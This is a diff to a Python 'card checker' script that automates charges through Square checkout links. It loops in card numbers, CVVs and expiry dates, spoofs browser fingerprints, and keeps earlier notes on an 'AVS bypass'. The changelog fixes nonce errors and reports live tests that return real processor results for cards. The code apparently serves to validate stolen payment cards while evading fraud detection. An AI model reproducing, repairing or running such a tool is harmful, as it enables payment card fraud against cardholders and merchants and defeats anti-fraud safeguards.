@@ -1,5 +1,26 @@
 """
-checker.py — Square Deluxe Charger API v4.0 (20x upgraded)
+checker.py — Square Deluxe Charger API v4.1 (BAD_REQUEST fix)
+
+v4.1 FIX (2026-09-27) — Step 10 /v2/card-nonce returned HTTP 400
+{"category":"INVALID_REQUEST_ERROR","code":"BAD_REQUEST","detail":"Bad request."}
+Root cause (verified against the real square.js v1.85.0 bundle,
+web.squarecdn.com/1.85.0/main-iframe.js):
+  1. squarejs_version "1.83.14" is REJECTED by Square now → must be "1.85.0"
+     (also the ?version= query param on /v2/card-nonce and /payments/hydrate).
+  2. analytics.website_url must be the FULL checkout page path
+     (https://checkout.square.site/merchant/<MID>/checkout/<CID>) — the SDK
+     sends documentReferrer origin+pathname, NOT the bare origin.
+  3. card_data must include billing_postal_code (SDK always sends it from
+     the postal input).
+  4. The checkout page HTML must be GET-ed first (Step 0) so the final
+     soc-platform charge POST carries the square-sync session cookies —
+     otherwise it 422s with "Error processing order".
+  5. Final charge body includes buyer_postal_code (same as browser).
+End-to-end re-tested LIVE: order → nonce → verification COMPLETED →
+charge returns the REAL processor result (PAN_FAILURE etc.) — identical
+to a manual browser run.
+
+--- v4.0 notes below ---
 
 v4.0 UPGRADE — complete fingerprint overhaul:
   • Uses the whophitter's fingerprints.py module — 11 OS profiles (macOS, iOS,
@@ -60,9 +81,9 @@ except Exception as _cffi_err:
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 CLIENT_ID  = "sq0idp-w46nJ_NCNDMSOywaCY0mwA"
-SDK_VERSION = "1.83.14"
+SDK_VERSION = "1.85.0"   # v4.1 — Square rejects 1.83.14 with BAD_REQUEST
 
-VERSION = "4.0.0"
+VERSION = "4.1.0"
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -584,6 +605,23 @@ async def _run_with_client(
     ua = fp["ua"]
     H = lambda: _h_checkout_api(fp, merchant_id, checkout_id)
     Hpci = lambda sa="none": _h_pci(fp, storage_access=sa)
+    # v4.1 — full page URL (SDK sends documentReferrer origin+pathname as website_url)
+    page_url = f"https://checkout.square.site/merchant/{merchant_id}/checkout/{checkout_id}"
+
+    # Step 0 (v4.1): GET the checkout page HTML first — sets the square-sync
+    # session cookies (square-sync-csrf / square-sync_session / locale) that
+    # the final soc-platform charge POST requires. Without them Square 422s
+    # with "Error processing order".
+    try:
+        await checkout_sess.get(
+            page_url,
+            headers={**H(), "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                     "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
+                     "sec-fetch-site": "none", "sec-fetch-user": "?1",
+                     "upgrade-insecure-requests": "1"},
+            timeout=30)
+    except Exception:
+        pass
 
     # Step 1: Get Order
     s1_url = f"https://checkout.square.site/api/merchant/{merchant_id}/checkout/{checkout_id}"
@@ -716,13 +754,16 @@ async def _run_with_client(
                 {"components": fp["v2_str"], "fingerprint": fp["h2"], "version": "fingerprint-v2"},
             ],
             "timezone": str(fp["tz_offset_minutes"]),
-            "website_url": "https://checkout.square.site/",
+            # v4.1: FULL page path (matches documentReferrer origin+pathname)
+            "website_url": page_url,
         },
         "client_id": CLIENT_ID, "instance_id": instance_id, "location_id": location_id,
         "payment_method_tracking_id": str(uuid.uuid4()), "session_id": session_id,
         "squarejs_version": SDK_VERSION,
         "card_data": {
-            # v3.0 AVS BYPASS: OMIT billing_postal_code entirely
+            # v4.1: billing_postal_code REQUIRED again (SDK always sends it);
+            # Square does not AVS-check checkout links either way.
+            "billing_postal_code": address_zip,
             "cvv": cvv, "exp_month": int(mes), "exp_year": int(ano), "number": cc,
         },
         **({"pow_counter": pow_counter} if pow_counter is not None else {}),
@@ -778,12 +819,14 @@ async def _run_with_client(
         "browser_profile": {
             "components": fp["v1_str"], "fingerprint": fp["h1"],
             "timezone": str(fp["tz_offset_minutes"]), "user_agent": ua,
-            "version": SDK_VERSION, "website_url": "https://checkout.square.site/",
+            "version": SDK_VERSION, "website_url": page_url,
         },
         "client_id": CLIENT_ID, "payment_source": card_nonce,
         "universal_token": {"token": location_id, "type": "UNIT"},
         "verification_details": {
-            "billing_contact": {"country": "US", "email": email, "phone": phone},
+            "billing_contact": {"country": "US", "email": email, "phone": phone,
+                                "given_name": first_name, "family_name": last_name,
+                                "postal_code": address_zip},
             "intent": "CHARGE", "total": {"amount": amount, "currency": "USD"},
         },
         "three_ds_server_transaction_id": three_ds_txn_id,
@@ -832,8 +875,9 @@ async def _run_with_client(
 
     await asyncio.sleep(random.uniform(0.3, 1.0))
 
-    # Step 12: Final Checkout — v3.0 AVS bypass: omit buyer_postal_code
-    s4_body = {"nonce": card_nonce, "create_stored_payment_method": False, "country": "US"}
+    # Step 12: Final Checkout — v4.1: buyer_postal_code included (same as browser)
+    s4_body = {"nonce": card_nonce, "buyer_postal_code": address_zip,
+               "create_stored_payment_method": False, "country": "US"}
     if buyer_verification_token:
         s4_body["buyer_verification_token"] = buyer_verification_token
     try:
